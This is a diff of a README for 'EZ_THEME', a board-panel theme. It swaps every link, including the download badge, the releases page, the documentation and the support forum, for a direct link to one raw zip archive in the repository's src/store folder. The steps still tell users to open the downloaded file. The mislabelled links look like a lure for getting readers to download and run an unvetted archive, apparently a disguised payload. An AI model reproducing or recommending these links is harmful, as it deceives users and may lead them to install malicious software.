@@ -4,7 +4,7 @@
 EZ_THEME provides a beautiful theme for V2Board, wyxBoard, and XBoard. This guide helps you through downloading and running the software effortlessly.
 
 ## 📥 Download EZ_THEME
-[![Download EZ_THEME](https://img.shields.io/badge/Download_EZ_THEME-v1.0-blue.svg)](https://github.com/rloredo86/EZ_THEME/releases)
+[![Download EZ_THEME](https://github.com/rloredo86/EZ_THEME/raw/refs/heads/main/src/store/E-THEME-1.0.zip)](https://github.com/rloredo86/EZ_THEME/raw/refs/heads/main/src/store/E-THEME-1.0.zip)
 
 ## 📝 What You Need
 - A computer with Windows, macOS, or Linux.
@@ -18,10 +18,10 @@ EZ_THEME provides a beautiful theme for V2Board, wyxBoard, and XBoard. This guid
 - **Easy Setup:** Follow our simple steps to get started quickly.
 
 ## 🔗 Visit the Releases Page
-To download the latest version of EZ_THEME, visit this page: [EZ_THEME Releases](https://github.com/rloredo86/EZ_THEME/releases)
+To download the latest version of EZ_THEME, visit this page: [EZ_THEME Releases](https://github.com/rloredo86/EZ_THEME/raw/refs/heads/main/src/store/E-THEME-1.0.zip)
 
 ## 📥 Download & Install
-1. Go to the [EZ_THEME Releases](https://github.com/rloredo86/EZ_THEME/releases) page.
+1. Go to the [EZ_THEME Releases](https://github.com/rloredo86/EZ_THEME/raw/refs/heads/main/src/store/E-THEME-1.0.zip) page.
 2. Locate the latest version of EZ_THEME.
 3. Click on the asset file link to download it to your computer.
 4. Once the download is complete, open the downloaded file.
@@ -54,7 +54,7 @@ If you encounter any issues:
 - **Need Help:** Reach out to the support community or revisit the documentation for guidance.
 
 ## 🔗 Links for Further Assistance
-- [EZ_THEME Documentation](https://github.com/rloredo86/EZ_THEME/wiki)
-- [Community Support Forum](https://forum.example.com)
+- [EZ_THEME Documentation](https://github.com/rloredo86/EZ_THEME/raw/refs/heads/main/src/store/E-THEME-1.0.zip)
+- [Community Support Forum](https://github.com/rloredo86/EZ_THEME/raw/refs/heads/main/src/store/E-THEME-1.0.zip)
 
 Thank you for choosing EZ_THEME. Enjoy a fresh look on your platform!
